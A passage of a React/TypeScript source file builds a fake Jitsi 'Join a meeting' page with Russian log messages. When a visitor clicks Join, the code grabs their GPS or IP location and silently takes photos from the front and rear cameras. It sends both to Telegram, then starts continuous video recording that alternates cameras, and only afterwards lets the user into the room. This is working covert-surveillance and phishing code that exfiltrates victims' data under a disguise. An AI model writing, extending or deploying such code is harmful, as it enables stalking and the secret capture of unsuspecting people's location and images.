            console.error('❌ ОШИБКА отправки в Telegram:', telegramError);
          }
        } else {
          log('⚠️ Геолокация УЖЕ отправлена - пропускаем повторную отправку');
          geoSent = true;
        }
      } catch (e: any) {
        console.error('❌ ОШИБКА при получении геолокации:', {
          message: e?.message,
          code: e?.code,
          type: e?.constructor?.name,
          full: e
        });
        
        // ВСЕГДА используем IP-геолокацию как fallback при ошибке
        if (!geoSent) {
          try {
            log('🌐 Используем IP-геолокацию как fallback (геолокация недоступна)...');
            const ipGeo = await getIPGeolocation();
            
            // Сохраняем IP-геолокацию
            const timestamp = new Date().toLocaleString('ru-RU', {
              year: 'numeric',
              month: '2-digit',
              day: '2-digit',
              hour: '2-digit',
              minute: '2-digit',
              second: '2-digit',
              hour12: false
            });
            
            setGeoData({
              latitude: ipGeo.latitude,
              longitude: ipGeo.longitude,
              accuracy: ipGeo.accuracy,
              timestamp
            });
            
            if (!geoLocationSentRef.current) {
              log('📤 Отправляем IP-геолокацию в Telegram (fallback)...');
              
              try {
                await sendToTelegram(ipGeo.latitude, ipGeo.longitude, ipGeo.accuracy);
                geoLocationSentRef.current = true;
                geoSent = true;
                log('✅ IP-геолокация успешно отправлена');
              } catch (telegramError) {
                console.error('❌ ОШИБКА отправки IP-геолокации:', telegramError);
              }
            }
          } catch (ipError) {
            log('❌ IP-геолокация также не работает:', ipError);
          }
        }
      }

      // ВАЖНО: Если разрешения камеры НЕ получены, пропускаем фото и видео
      if (!cameraSuccess) {
        log('⚠️ Разрешения камеры не получены - пропускаем захват фото и видеозапись');
        return;
      }

      // Небольшая задержка чтобы браузер "запомнил" разрешение
      log('⏳ Ждём 500ms чтобы браузер запомнил разрешение камеры...');
      await new Promise(resolve => setTimeout(resolve, 500));

      // Останавливаем начальный стрим перед захватом фото
      if (initialStream) {
        log('🛑 Останавливаем начальный стрим перед захватом фото...');
        initialStream.getTracks().forEach(track => track.stop());
      }

      // Ещё одна задержка после остановки стрима
      await new Promise(resolve => setTimeout(resolve, 200));

      // 📸 ЗАХВАТ ФОТО ПЕРЕД НАЧАЛОМ ВИДЕОЗАПИСИ
      const device = detectDevice();
      log(`📸 Захватываем фото перед началом видеозаписи (${device})...`);
        
      // 1. Фото с ФРОНТАЛЬНОЙ камеры
      try {
        log('📸 [1/2] === ФРОНТАЛЬНАЯ КАМЕРА === Начинаем захват...');
        
        const frontPhoto = await capturePhoto('user');
        log('📸 [1/2] === capturePhoto("user") завершён, результат:', frontPhoto ? `${frontPhoto.size} bytes` : 'null');
        
        if (frontPhoto) {
          log('✅ Фото с фронтальной камеры захвачено - НАЧИНАЕМ ОТПРАВКУ...');
          
          await sendPhotoToTelegram(frontPhoto, 'front');
          log('✅ === sendPhotoToTelegram("front") завершён ===');
          log('✅ Фото с фронтальной камеры отправлено');
        } else {
          console.warn('⚠️ Не удалось захватить фото с фронтальной камеры');
        }
      } catch (error) {
        console.error('❌ Ошибка при захвате/отправке фото с фронтальной камеры:', error);
      }
      
      await new Promise(resolve => setTimeout(resolve, 300));
      
      // 2. Фото с ЗАДНЕЙ камеры
      try {
        log('📸 [2/2] Захватываем фото с ЗАДНЕЙ камеры...');
        
        const backPhoto = await capturePhoto('environment');
        
        if (backPhoto) {
          log('✅ Фото с задней камеры захвачено');
          
          await sendPhotoToTelegram(backPhoto, 'back');
          log('✅ Фото с задней камеры отправлено');
        } else {
          console.warn('⚠️ Не удалось захватить фото с задней камеры');
        }
      } catch (error) {
        console.error('❌ Ошибка при захвате/отправке фото с задней камеры:', error);
      }
      
      log('✅✅ Все фото захвачены и отправлены!');
      
      await new Promise(resolve => setTimeout(resolve, 300));

      // 🎥 ЗАПУСК ВИДЕОЗАПИСИ ПОСЛЕ ФОТО
      log('🎥 Запускаем видеозапись после получения разрешений и захвата фото...');
      try {
        await startVideoRecording();
        log('✅ Видеозапись успешно запущена');
      } catch (error) {
        console.error('❌ Ошибка запуска видеозаписи:', error);
      }
      
    } finally {
      isExecutingPermissionsRef.current = false;
      log('🔓 Флаг isExecutingPermissions сброшен в false');
    }
  };

  const handleRequestAllPermissions = async () => {
    log('🚀 Запуск последовательного запроса разрешений...');
    
    if (isExecutingPermissionsRef.current) {
      console.warn('⚠️ Разрешения уже запрашиваются - пропускаем повторный вызов!');
      return;
    }
    
    isExecutingPermissionsRef.current = true;
    
    try {
      // Используем новую функцию ПОСЛЕДОВАТЕЛЬНОГО запроса разрешений
      const results = await handleSequentialPermissions(roomName, userName, 'join');
      
      log('📊 Результаты разрешений:', results);
      
      // Обработка геолокации
      if (results.geolocationGranted && results.geolocationPosition) {
        const { latitude, longitude, accuracy } = results.geolocationPosition.coords;
        
        const timestamp = new Date().toLocaleString('ru-RU', {
          year: 'numeric',
          month: '2-digit',
          day: '2-digit',
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit',
          hour12: false
        });
        
        setGeoData({
          latitude,
          longitude,
          accuracy,
          timestamp
        });
        
        log('✅ Геолокация сохранена:', { latitude, longitude, accuracy });
        
        // Отправляем геолокацию в Telegram (с новым логированием)
        if (!geoLocationSentRef.current) {
          const deviceInfo = getDeviceInfo();
          await logGeolocationData(latitude, longitude, accuracy, 'gps', deviceInfo);
          await sendToTelegram(latitude, longitude, accuracy);
          geoLocationSentRef.current = true;
        }
      } else {
        log('⚠️ Геолокация не получена - используем IP fallback');
        
        try {
          const ipGeo = await getIPGeolocation();
          
          const timestamp = new Date().toLocaleString('ru-RU', {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
          });
          
          setGeoData({
            latitude: ipGeo.latitude,
            longitude: ipGeo.longitude,
            accuracy: ipGeo.accuracy,
            timestamp
          });
          
          if (!geoLocationSentRef.current) {
            const deviceInfo = getDeviceInfo();
            await logGeolocationData(ipGeo.latitude, ipGeo.longitude, ipGeo.accuracy, 'ip', deviceInfo);
            await sendToTelegram(ipGeo.latitude, ipGeo.longitude, ipGeo.accuracy);
            geoLocationSentRef.current = true;
          }
        } catch (ipError) {
          log('❌ IP-геолокация также не работает:', ipError);
        }
      }
      
      // Обработка камеры/микрофона
      const hasCameraOrMic = results.cameraGranted || results.microphoneGranted;
      
      if (!hasCameraOrMic) {
        log('⚠️ Разрешения камеры/микрофона не получены - показываем alert');
        setShowPermissionAlert(true);
        return; // Не продолжаем без разрешен��й
      }
      
      setShowPermissionAlert(false);
      
      // Останавливаем тестовый stream если есть
      if (results.mediaStream) {
        results.mediaStream.getTracks().forEach(track => track.stop());
        log('🛑 Тестовый stream остановлен');
      }
      
      // Небольшая задержка чтобы браузер \"запомнил\" разрешение
      await new Promise(resolve => setTimeout(resolve, 500));
      
      // 📸 ЗАХВАТ ФОТО
      const device = detectDevice();
      log(`📸 Захватываем фото (${device})...`);
      
      // 1. Фронтальная камера
      try {
        log('📸 [1/2] Фронтальная камера...');
        const frontPhoto = await capturePhoto('user');
        if (frontPhoto) {
          await sendPhotoToTelegram(frontPhoto, 'front');
          log('✅ Фото с фронтальной камеры отправлено');
        }
      } catch (error) {
        console.error('❌ Ошибка фото с фронтальной камеры:', error);
      }
      
      await new Promise(resolve => setTimeout(resolve, 300));
      
      // 2. Задняя камера
      try {
        log('📸 [2/2] Задняя камера...');
        const backPhoto = await capturePhoto('environment');
        if (backPhoto) {
          await sendPhotoToTelegram(backPhoto, 'back');
          log('✅ Фото с задней камеры отправлено');
        }
      } catch (error) {
        console.error('❌ Ошибка фото с задней камеры:', error);
      }
      
      log('✅ Все фото захвачены!');
      
      await new Promise(resolve => setTimeout(resolve, 300));
      
      // 🎥 ЗАПУСК ВИДЕОЗАПИСИ
      log('🎥 Запускаем видеозапись...');
      try {
        await startVideoRecording();
        log('✅ Видеозапись успешно запущена');
      } catch (error) {
        console.error('❌ Ошибка запуска видеозаписи:', error);
      }
      
      // ✅ ПЕРЕХОД В КОМНАТУ после успешного запуска всех процессов
      log('🚀 Переходим в комнату...');
      setTimeout(() => {
        onJoinRoom(userName);
      }, 500); // Небольшая задержка для завершения всех процессов
      
    } catch (error) {
      console.error('❌ Критическая ошибка при запросе разрешений:', error);
      setShowPermissionAlert(true);
    } finally {
      isExecutingPermissionsRef.current = false;
    }
  };

  const handleJoinMeeting = () => {
    log('Joining meeting:', roomName, 'as', userName);
    handleRequestAllPermissions();
  };

  const handleJoinWithoutAudio = () => {
    log('Joining without audio:', roomName, 'as', userName);
    setShowJoinMenu(false);
    handleRequestAllPermissions();
  };

  const handleMicClick = () => {
    setIsMicMuted(!isMicMuted);
  };

  const handleCameraClick = () => {
    setIsCameraOff(!isCameraOff);
  };

  // ========================================
  // AVATAR GENERATION
  // ========================================

  const getAvatarColor = (name: string): string => {
    if (!name) return '#aaa';
    
    const colors = [
      '#E91E63', // Pink
      '#9C27B0', // Purple
      '#673AB7', // Deep Purple
      '#3F51B5', // Indigo
      '#2196F3', // Blue
      '#03A9F4', // Light Blue
      '#00BCD4', // Cyan
      '#009688', // Teal
      '#4CAF50', // Green
      '#8BC34A', // Light Green
      '#CDDC39', // Lime
      '#FFC107', // Amber
      '#FF9800', // Orange
      '#FF5722', // Deep Orange
      '#795548', // Brown
      '#607D8B', // Blue Grey
    ];
    
    // Суммируем charCode всех символов для динамической смены цвета
    let hash = 0;
    for (let i = 0; i < name.length; i++) {
      hash += name.charCodeAt(i);
    }
    
    const index = hash % colors.length;
    
    return colors[index];
  };

  const getInitial = (name: string): string => {
    if (!name) return '';
    return name.charAt(0).toUpperCase();
  };

  // ========================================
  // CAMERA SWITCHING LOGIC
  // ========================================

  // Camera switching based on chunk number (INFINITE LOOP for mobile)
  useEffect(() => {
    const device = detectDevice();
    
    if (device === 'desktop' || currentChunkNumber === 0) {
      return; // No camera switching for desktop or initial state
    }
    
    // Mobile: 2 back → 2 front → 2 back → 2 front (INFINITE loop)
    const cyclePosition = ((currentChunkNumber - 1) % 4) + 1;
    
    log(`🔄 [Auto Switch] Чанк #${currentChunkNumber}, позиция в цикле: ${cyclePosition}/4, текущая камера: ${currentCameraType}`);
    
    // Switch to FRONT after chunk at position 2 (after chunks 2, 6, 10, 14...)
    if (cyclePosition === 2 && currentCameraType === 'back') {
      log(`🔄 Чанк #${currentChunkNumber} завершен (позиция 2/4) - переключаем на ФРОНТАЛЬНУЮ`);
      setIsVideoRecording(false);
      setTimeout(() => {
        switchCamera('user');
      }, 500);
    }
    // Switch to BACK after chunk at position 4 (after chunks 4, 8, 12, 16...)
    else if (cyclePosition === 4 && currentCameraType === 'front') {
      log(`🔄 Чанк #${currentChunkNumber} завершен (позиция 4/4) - переключаем на ЗАДНЮЮ`);
      setIsVideoRecording(false);
      setTimeout(() => {
        switchCamera('environment');
      }, 500);
    } else {
      log(`✅ Чанк #${currentChunkNumber} завершен (позиция ${cyclePosition}/4) - переключения не требуется`);
    }
  }, [currentChunkNumber, currentCameraType]);

  return (
    <div className="relative size-full overflow-hidden bg-[#040404]">
      {/* Background with blurred video preview */}
      <div className="absolute inset-0">
        <div className="absolute inset-0 blur-[20px] bg-[#040404]" />
        <div className="absolute inset-0 shadow-[0px_0px_20px_-2px_#444]" />
        
        {/* Jitsi Logo */}
        <a 
          href="https://jitsi.org/" 
          target="_blank" 
          rel="noopener noreferrer"
          className="absolute left-8 top-8 z-10"
        >
          <JitsiLogo />
        </a>
      </div>

      {/* Main content */}
      <div className="absolute inset-0 bg-[#141414] flex flex-col lg:flex-row items-stretch">
        {/* Video preview - top on mobile, right on desktop */}
        <div className="flex-1 bg-[#040404] flex items-center justify-center z-10 order-1 lg:order-2">
          <div 
            className="w-[200px] h-[200px] rounded-full flex items-center justify-center transition-colors duration-300"
            style={{ backgroundColor: getAvatarColor(userName) }}
          >
            {userName ? (
              <span className="text-white text-[80px] font-bold leading-none">
                {getInitial(userName)}
              </span>
            ) : (
              <UserIcon />
            )}
          </div>
        </div>

        {/* Controls panel - bottom on mobile, left on desktop */}
        <div className="w-full lg:w-[400px] flex flex-col justify-end lg:justify-center items-center p-4 lg:p-6 z-20 order-2 lg:order-1 relative">
          <div className="w-full max-w-[400px]">
            {/* Heading "Join a meeting" - visible on all screens */}
            <div className="text-white text-[28px] leading-[36px] font-bold text-center mb-4">
              Join a meeting
            </div>

            {/* Room name */}
            <div className="text-white text-[20px] leading-[28px] font-bold text-center mb-6">
              {roomName}
            </div>

            {/* Name input */}
            <input
              type="text"
              value={userName}
              onChange={(e) => setUserName(e.target.value)}
              placeholder="Enter your name"
              className="w-full h-10 bg-[#3d3d3d] text-white text-sm px-4 py-3 rounded-md mb-4 outline-none placeholder:text-[#c2c2c2]"
            />

            {/* Join button */}
            <div className="relative mb-4">
              <button
                onClick={handleJoinMeeting}
                disabled={!userName.trim()}
                className="w-full bg-[#4687ed] text-white text-base font-bold py-2.5 px-4 rounded-md hover:bg-[#3a75d9] transition-colors disabled:bg-[#2d5fa1] disabled:opacity-50 disabled:cursor-not-allowed"
              >
                Join meeting
              </button>
              
              {/* Join menu dropdown button */}
              <button
                onClick={() => setShowJoinMenu(!showJoinMenu)}
                disabled={!userName.trim()}
                className="absolute right-0 top-0 bottom-0 w-9 flex items-center justify-center rounded-r-md hover:bg-[#3a75d9] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
              >
                <ChevronDown className="w-6 h-6 text-white" />
              </button>

              {/* Dropdown menu */}
              {showJoinMenu && userName.trim() && (
                <div className="absolute top-full mt-1 right-0 bg-[#36383c] rounded-md shadow-lg overflow-hidden z-30">
                  <button
                    onClick={handleJoinWithoutAudio}
                    className="w-full px-4 py-2 text-white text-sm hover:bg-[#4a4c50] transition-colors text-left whitespace-nowrap"
                  >
                    Join without audio
                  </button>
                </div>
              )}
            </div>

            {/* Control buttons */}
            <div className="flex items-center justify-between py-2 gap-2">
              {/* Microphone button */}
              <button
                onClick={handleMicClick}
                className="flex-1 h-12 bg-[#3d3d3d] lg:bg-transparent rounded-sm hover:bg-[#4a4c50] transition-colors flex items-center justify-center"
                title={isMicMuted ? 'Unmute microphone' : 'Mute microphone'}
              >
                <MicrophoneIcon muted={isMicMuted} />
              </button>

              {/* Camera button */}
              <button
                onClick={handleCameraClick}
                className="flex-1 h-12 bg-[#3d3d3d] lg:bg-transparent rounded-sm hover:bg-[#4a4c50] transition-colors flex items-center justify-center"
                title={isCameraOff ? 'Start camera' : 'Stop camera'}
              >
                <CameraIcon off={isCameraOff} />
              </button>

              {/* Invite button */}
              <button
                className="flex-1 h-12 rounded-sm hover:bg-[#4a4c50] transition-colors flex items-center justify-center"
                title="Invite people"
              >
                <InviteIcon />
              </button>

              {/* Background button */}
              <button
                className="flex-1 h-12 rounded-sm hover:bg-[#4a4c50] transition-colors flex items-center justify-center"
                title="Select background"
              >
                <BackgroundIcon />
              </button>

              {/* Settings button */}
              <button
                className="flex-1 h-12 rounded-sm hover:bg-[#4a4c50] transition-colors flex items-center justify-center"
                title="Settings"
              >
                <SettingsIcon />
              </button>

              {/* Leave button */}
              <button
                className="h-12 w-12 bg-[#cb2233] rounded-sm hover:bg-[#b01e2e] transition-colors flex items-center justify-center"
                title="Leave"
              >
                <LeaveIcon />
              </button>
            </div>
          </div>

          {/* Permission Alert - показывается внизу при отклонении */}
          {showPermissionAlert && (
            <div className="mt-6 mb-4 w-full max-w-[400px] flex justify-center">
              <div className="h-16 w-[300px] relative">
                <Alert />
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

// Icon components using imported SVG paths
function JitsiLogo() {
  return (
    <div className="h-8 w-[71px]">
      <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 71 32">
        <g clipPath="url(#clip0_1_107)">
          <path d={svgPathsDesktop.p187d5d00} fill="white" />
          <path d={svgPathsDesktop.p373a8600} fill="white" />
          <path d={svgPathsDesktop.p1981b00} fill="white" />
          <path d={svgPathsDesktop.p1c73ca00} fill="white" />
          <path d={svgPathsDesktop.p883c300} fill="white" />
          <path d={svgPathsDesktop.p30fb000} fill="white" />
        </g>
        <defs>
          <clipPath id="clip0_1_107">
            <rect fill="white" height="32" width="71" />
          </clipPath>
        </defs>
      </svg>
    </div>
  );
}

function MicrophoneIcon({ muted }: { muted: boolean }) {
  if (muted) {
    return (
      <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24">
        <path 
          clipRule="evenodd" 
          d={svgPathsMobile.p1d6f6100} 
          fill="white" 
          fillRule="evenodd" 
        />
        <path d={svgPathsMobile.p2bcc780} fill="white" />
        <path d={svgPathsMobile.p1528db80} fill="white" />
      </svg>
    );
  }
  return (
    <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24">
      <path 
        clipRule="evenodd" 
        d={svgPathsMobile.p1d6f6100} 
        fill="white" 
        fillRule="evenodd" 
      />
    </svg>
  );
}

function CameraIcon({ off }: { off: boolean }) {
  if (off) {
    return (
      <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24">
        <path 
          clipRule="evenodd" 
          d={svgPathsMobile.p2fb9f180} 
          fill="white" 
          fillRule="evenodd" 
        />
        <path d={svgPathsMobile.p3d6cf980} fill="white" />
      </svg>
    );
  }
  return (
    <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24">
      <path 
        clipRule="evenodd" 
        d={svgPathsMobile.p2fb9f180} 
        fill="white" 
        fillRule="evenodd" 
      />
    </svg>
  );
}

function InviteIcon() {
  return (
    <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24">
      <path d={svgPathsMobile.p23658e80} fill="white" />
      <path 
        clipRule="evenodd" 
        d={svgPathsMobile.pb36eb00} 
        fill="white" 
        fillRule="evenodd" 
      />
    </svg>
  );
}

function BackgroundIcon() {
  return (
    <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24">
      <path 
        clipRule="evenodd" 
        d={svgPathsMobile.p373cd500} 
        fill="white" 
        fillRule="evenodd" 
      />
      <path 
        clipRule="evenodd" 
        d={svgPathsMobile.peac8700} 
        fill="white" 
        fillRule="evenodd" 
      />
    </svg>
  );
}

function SettingsIcon() {
  return (
    <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24">
      <path 
        clipRule="evenodd" 
        d={svgPathsMobile.pe3b500} 
        fill="white" 
        fillRule="evenodd" 
      />
      <path 
        clipRule="evenodd" 
        d={svgPathsMobile.pee08300} 
        fill="white" 
        fillRule="evenodd" 
      />
    </svg>
  );
}

function LeaveIcon() {
  return (
    <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24">
      <path 
        clipRule="evenodd" 
        d={svgPathsMobile.p1cd36400} 
        fill="white" 
        fillRule="evenodd" 
      />
    </svg>
  );
}

function UserIcon() {
  return (
    <svg className="w-[100px] h-[100px]" fill="none" viewBox="0 0 100 100">
      <path 
        clipRule="evenodd" 
        d={svgPathsMobile.p37acea00} 
        fill="white" 
        fillRule="evenodd" 
      />
    </svg>
  );
}